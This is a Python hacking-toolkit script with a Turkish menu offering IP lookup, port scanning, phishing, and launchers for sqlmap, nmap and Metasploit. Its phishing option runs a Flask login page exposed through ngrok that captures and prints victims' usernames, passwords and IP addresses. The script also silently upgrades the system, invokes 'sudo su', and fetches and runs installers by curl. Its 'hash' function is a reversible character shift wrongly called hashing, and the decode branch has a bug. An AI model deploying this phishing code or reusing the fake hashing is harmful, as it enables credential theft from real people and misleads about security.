import os
import socket
import colorama
import signal
import sys
import pyfiglet
import platform
import zipfile
import urllib.request
import keyboard
import time
import subprocess
from colorama import Fore, Back, Style
from datetime import datetime
from flask import Flask, request, render_template
from pyngrok import ngrok
from unidecode import unidecode

colorama.init()

current_system = platform.system()

if current_system == "Linux":
    os.system("apt update -y && apt upgrade -y")
    os.system("clear")
    print(Fore.LIGHTGREEN_EX + "Sisteminiz güncellendi!")

def check_nmap_and_run():
    if not os.path.exists("nmap.exe"):
        print(Fore.RED + "nmap.exe dosyası bulunamadı, indiriliyor...")
        try:
            subprocess.run(["curl", "-o", "nmap.exe", "https://nmap.org/dist/nmap-7.95-setup.exe"], check=True)
            print("nmap.exe başarıyla indirildi.")
            
            # İndirdikten sonra nmap.exe'yi çalıştıralım
            try:
                subprocess.Popen(["nmap.exe"], shell=True)
                os.system("cls")
                print(Fore.LIGHTGREEN_EX + "nmap.exe başarıyla çalıştırıldı.")
            except Exception as e:
                print(f"Hata: {e}")

        except subprocess.CalledProcessError as e:
            print(f"Hata: {e}")
            return False

    else:
        print(Fore.LIGHTGREEN_EX + "nmap.exe dosyası zaten var, doğrudan işleme geçiliyor...")
        open_cmd_and_run_nmap()

def open_cmd_and_run_nmap():
    try:
        # Windows + R tuş kombinasyonu
        keyboard.send("windows+r")
        time.sleep(0.5)  # Küçük bir bekleme süresi

        # "cmd" yazıp Enter tuşuna basma
        keyboard.write("cmd")
        time.sleep(0.5)  # Biraz daha bekleyelim
        keyboard.send("enter")

        # "nmap" yazıp Enter tuşuna basma
        time.sleep(0.5)  # Biraz daha bekleyelim
        keyboard.write("nmap")
        keyboard.send("enter")
        os.system("cls")
        print(Fore.LIGHTGREEN_EX + "Komut İstemi açıldı ve nmap komutu çalıştırıldı.")
    except Exception as e:
        print(f"Hata: {e}")


def check_metasploit_and_run():
    if not os.path.exists("metasploit.msi"):
        print(Fore.RED + "metasploit.msi dosyası bulunamadı, indiriliyor...")
        try:
            subprocess.run(["curl", "-o", "metasploit.msi", "https://windows.metasploit.com/metasploitframework-latest.msi"], check=True)
            print("metasploit.msi başarıyla indirildi.")
            
            # İndirdikten sonra metasploit.msi'yi çalıştıralım
            try:
                subprocess.Popen(["metasploit.msi"], shell=True)
                os.system("cls")
                print(Fore.LIGHTGREEN_EX + "metasploit.msi başarıyla çalıştırıldı.")
            except Exception as e:
                print(f"Hata: {e}")

        except subprocess.CalledProcessError as e:
            print(f"Hata: {e}")
            return False

    else:
        os.system("cls")
        print(renkli_ascii)
        print(Fore.LIGHTGREEN_EX + "metasploit.msi dosyası zaten var, doğrudan işleme geçiliyor...")
        open_cmd_and_run_metasploit()


def open_cmd_and_run_metasploit():
    try:
        os.system("C:\\metasploit-framework\\bin\\msfconsole.bat")
    except Exception as e:
        print(f"Hata: {e}")

def custom_hash(data, hash_key):
    # Hash anahtarının (hash_key) ASCII değerlerinin toplamını alalım
    key_sum = sum(ord(char) for char in hash_key)

    # Veriyi hashlemek için kullanacağımız anahtar
    key = key_sum

    # Türkçe harfleri İngilizce harflere dönüştürelim
    data = unidecode(data)

    # Veriyi hashlemek için kullanılacak basit bir algoritma örneği
    # Her karakterin ASCII değerine key değerini ekleyerek hashleme yapalım
    hashed_data = ""
    for char in data:
        hashed_char = chr((ord(char) + key) % 256)  # 256'ya mod alarak ASCII sınırlarında tutuyoruz
        hashed_data += hashed_char

    return hashed_data

def custom_decode(hashed_data, hash_key):
    try:
        # Hash anahtarının (hash_key) ASCII değerlerinin toplamını alalım
        key_sum = sum(ord(char) for char in hash_key)

        # Veriyi çözmek için kullanacağımız anahtar
        key = key_sum

        # Hashlenmiş veriyi orijinal veriye dönüştürmek için key değerini geri çıkaralım
        original_data = ""
        for char in hashed_data:
            original_char = chr((ord(char) - key) % 256)  # 256'ya mod alarak ASCII sınırlarında tutuyoruz
            original_data += original_char

        # İngilizce harfleri Türkçe harflere geri dönüştürelim
        original_data = unidecode(original_data)

        return original_data
    except ValueError:
        return "Yanlış anahtar kullanıldı. Veri çözülemedi."

metin = "Root"

# Figlet formatında metni yazdır
ascii_art = pyfiglet.figlet_format(metin)

# Renkleri uygula
renkli_ascii = Fore.RED + ascii_art

colorama.init()

current_system = platform.system()

if current_system == "Linux":
    os.system("clear")
elif current_system == "Windows":
    os.system("cls")

while True:

    metin = "Root"

    # Figlet formatında metni yazdır
    ascii_art = pyfiglet.figlet_format(metin)

    # Renkleri uygula
    renkli_ascii = Fore.RED + ascii_art

    # Ekrana yazdır
    print(renkli_ascii)

    islem = int(input(Fore.LIGHTCYAN_EX + "[1] İp scanner\n[2] Port scanner\n[3] Phishing\n[4] Sqlmap\n[5] Nmap\n[6] Metasploit\n[7] Root Encode & Decode\n[0] Çıkış\n"))
    
    if current_system == "Linux":
        os.system("clear")
    elif current_system == "Windows":
        os.system("cls")
    print(renkli_ascii)

    if islem == 1:

        if current_system == "Linux":

            os.system("clear")

        elif current_system == "Windows":
            os.system("cls")
        print(renkli_ascii)

        def get_ip_address(url):
            try:
                ip_address = socket.gethostbyname(url)
                return ip_address
            except socket.gaierror:
                return "Geçersiz URL veya DNS çözümleme hatası."

        if __name__ == "__main__":
            url = input(Fore.LIGHTCYAN_EX + "Lütfen IP adresini almak istediğiniz sitenin URL'sini girin: ")
            if url.startswith("http://") or url.startswith("https://"):
                url = url.split("://")[1]  # URL'deki "http://" veya "https://" kısmını kaldırır
            ip_address = get_ip_address(url)

            if current_system == "Linux":

                os.system("clear")

            elif current_system == "Windows":
                os.system("cls")

            print(Back.BLACK + Fore.LIGHTGREEN_EX + f"{url} sitesinin IP adresi: {ip_address}")
    elif islem == 2:

        # Hedef IP veya hostname
        target = input("Hedef IP veya hostname girin: ")

        # Öncelikli portları kullanıcıdan al
        priority_ports_input = input(Fore.LIGHTGREEN_EX + "Öncelikli olarak taranacak portları virgülle ayırarak girin (örneğin: 80,443,21): ")

        if current_system == "Linux":

            os.system("clear")

        elif current_system == "Windows":
            os.system("cls")

        priority_ports = [int(port.strip()) for port in priority_ports_input.split(',')]

        from datetime import datetime
        

        # Hedef IP'yi çözümler
        target_ip = socket.gethostbyname(target)

        # Tarama başlama zamanı
        start_time = datetime.now()

        print("-" * 50)
        print(f"Tarama başlıyor: {target_ip}")
        print("Başlama Zamanı:", str(start_time))
        print("-" * 50)

        # SIGINT (CTRL+C) sinyalini yakala
        def signal_handler(sig, frame):
            print("\nTaramadan çıkılıyor.")
            end_time = datetime.now()
            print("-" * 50)
            print("Tarama Bitti")
            print("Bitiş Zamanı:", str(end_time))
            print("Geçen Süre:", str(end_time - start_time))
            print("-" * 50)
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        # Öncelikli portları tarar
        try:
            for port in priority_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    print(f"Port {port}: Açık")
                sock.close()
        
            # Diğer portları tarar
            for port in range(1, 1025):
                if port not in priority_ports:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    socket.setdefaulttimeout(1)
                    result = sock.connect_ex((target_ip, port))
                    if result == 0:
                        print(f"Port {port}: Açık")
                    sock.close()
        except KeyboardInterrupt:
            print("\nTaramadan çıkılıyor.")
            exit()
        except socket.gaierror:
            print("\nHostname çözümleme hatası. Çıkılıyor.")
            exit()
        except socket.error:
            print("\nSunucuya bağlanılamadı. Çıkılıyor.")
            exit()

            # Tarama bitiş zamanı
        end_time = datetime.now()
        print("-" * 50)
        print("Tarama Bitti")
        print("Bitiş Zamanı:", str(end_time))
        print("Geçen Süre:", str(end_time - start_time))
        print("-" * 50)


    elif islem == 3:



        app = Flask(__name__)

        @app.route('/', methods=['GET', 'POST'])
        def index():
            if request.method == 'POST':

                if current_system == "Linux":

                    os.system("clear")

                elif current_system == "Windows":
                    os.system("cls")

                username = request.form['username']
                password = request.form['password']
                print("Kullanıcı Adı:", username)  # Kullanıcı adını konsola yazdır
                print("Şifre:", password)         # Şifreyi konsola yazdır
                # Ziyaretçinin IP adresini al
                ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
                print("IP Adresi:", ip_address)  # Ziyaretçinin IP adresini konsola yazdır
            return render_template('index.html')

        if __name__ == '__main__':
        # ngrok'u kullanarak lokal Flask sunucunuzu internete açın
            public_url = ngrok.connect(5000)
            print("Dış ağa açılan URL:", public_url)  # ngrok tarafından sağlanan genel URL'yi yazdırın

        # Flask uygulamasını çalıştırın
            app.run()

        # Flask sunucusu durduğunda ngrok bağlantısını kesin
            ngrok.disconnect(public_url)

            if current_system == "Linux":

                os.system("clear")

            elif current_system == "Windows":
                os.system("cls")

    elif islem == 4:
            if current_system == "Linux":

                os.system("apt install sqlmap -y&&clear&&sqlmap")

            elif current_system == "Windows":
                os.system("cls")


                # Scriptin çalıştığı dizini temsil eden değişken
                current_directory = os.getcwd()

                # İndirilecek zip dosyasının URL'si
                zip_url = "https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip"

                # Zip dosyasının adı
                zip_file_name = "master.zip"

                try:
                    # master.zip dosyasını indir
                    urllib.request.urlretrieve(zip_url, os.path.join(current_directory, zip_file_name))

                    # Zip dosyasını aç
                    with zipfile.ZipFile(os.path.join(current_directory, zip_file_name), 'r') as zip_ref:
                    # Hedef dizine çıkart
                        zip_ref.extractall(current_directory)
    
                    # Dosyayı çıkarttıktan sonra master.zip dosyasını silebilirsiniz
                    os.remove(os.path.join(current_directory, zip_file_name))

                    print(Fore.LIGHTGREEN_EX + f"{zip_file_name} dosyası {current_directory} dizinine başarıyla çıkartıldı ve silindi.")
                except zipfile.BadZipFile:
                    print(f"Hata! {zip_file_name} geçersiz bir zip dosyası.")
                except Exception as e:
                    print(f"Hata! Dosya çıkartılırken bir hata oluştu: {e}")

                # Windows tuşu ile 'r' tuşuna basarak Run penceresini açma
                keyboard.send('windows+r')
                time.sleep(0.5)  # Pencerenin açılması için kısa bir süre bekleyin

                # Açılan pencereye 'cmd' yazarak Enter tuşuna basma
                keyboard.write('cmd')
                keyboard.press_and_release('enter')
                time.sleep(0.5)  # Komut satırının hazır olması için kısa bir süre bekleyin

                # İlgili komutları sırayla yazma ve Enter tuşuna basma
                commands = [
                    'cd Downloads\\',        # Downloads dizinine geçiş
                    'cd Root-master\\',      # Root-master dizinine geçiş
                    'cd sqlmap-master\\',    # sqlmap-master dizinine geçiş
                    'cls',
                    'python sqlmap.py'       # sqlmap.py dosyasını çalıştırma
                ]

                for command in commands:
                    keyboard.write(command)
                    keyboard.press_and_release('enter')
                    time.sleep(0.5)  # Her komuttan sonra kısa bir süre bekleyin



    elif islem == 5:
        if current_system == "Linux":
            os.system("apt install nmap -y&&nmap")
        elif current_system == "Windows":
            check_nmap_and_run()

    elif islem == 6:
        if current_system == "Linux":
            os.system("cd&&sudo su")
            os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall")
        elif current_system == "Windows":
            check_metasploit_and_run()
    elif islem == 7:
        def main():
            if current_system == "Linux":
                os.system("clear")
            elif current_system == "Windows":
                os.system("cls")

        while True:
            print(Fore.LIGHTGREEN_EX + "1 - Veriyi Hashle")
            print(Fore.LIGHTGREEN_EX + "2 - Hash'i Çöz")
            print(Fore.LIGHTGREEN_EX + "0 - Çıkış")

            secim = input("Lütfen yapmak istediğiniz işlemi seçin (1/2/0): ")

            if secim == '1':
                hash_secimi = input("Hash sistemini belirtin (Örneğin, 'mrx'): ")
                veri = input("Hashlemek istediğiniz veriyi girin: ")

                hashlenmis_veri = custom_hash(veri, hash_secimi)
                if current_system == "Linux":
                    os.system("clear")
                elif current_system == "Windows":
                    os.system("cls")
                print(renkli_ascii)
                print(Fore.LIGHTGREEN_EX + "Hashlenmiş veri:", hashlenmis_veri)

            elif secim == '2':
                hash_secimi = input("Hash sistemini belirtin (Örneğin, 'mrx'): ")
                hash_veri = input("Çözmek istediğiniz hash'i girin: ")

                cozulmus_veri = custom_decode(hash_veri, hash_secimi)

                hashlenmis_veri = custom_hash(veri, hash_secimi)
                if current_system == "Linux":
                    os.system("clear")
                elif current_system == "Windows":
                    os.system("cls")
                print(renkli_ascii)
                print(Fore.LIGHTGREEN_EX + "Çözülmüş veri:", cozulmus_veri)

            elif secim == '0':
                print(Fore.LIGHTGREEN_EX + "Çıkış yapılıyor...")
                if current_system == "Linux":
                    os.system("clear")
                elif current_system == "Windows":
                    os.system("cls")
                break

            else:
                print(Fore.LIGHTRED_EX + "Geçersiz seçim!")

        if __name__ == "__main__":
            if islem == 7:
                main()

    if islem == 0:
        print(Fore.LIGHTGREEN_EX + "Çıkış yapılıyor...")
        break